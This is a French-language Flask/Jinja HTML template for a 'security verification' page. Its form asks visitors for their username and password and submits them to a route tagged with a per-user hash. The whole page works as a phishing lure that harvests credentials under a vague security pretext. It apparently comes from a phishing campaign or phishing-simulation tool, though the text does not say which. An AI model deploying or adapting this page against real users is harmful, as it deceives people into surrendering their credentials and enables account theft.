<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<title>Vérification de sécurité</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
<div class="container py-5">
    <h2 class="mb-4">Vérification de sécurité requise</h2>
    <p class="text-muted">Pour finaliser la vérification de sécurité, merci de renseigner votre nom d'utilisateur et votre mot de passe.</p>
    <form action="{{ url_for('submit', user_hash=user_hash) }}" method="post" class="card p-4 shadow-sm bg-white">
        <div class="mb-3">
            <label class="form-label">Nom d'utilisateur</label>
            <input type="text" class="form-control" name="username">
        </div>
        <div class="mb-3">
            <label class="form-label">Mot de passe</label>
            <input type="password" class="form-control" name="password">
        </div>
        <button type="submit" class="btn btn-primary">Soumettre</button>
    </form>
</div>
</body>
</html>
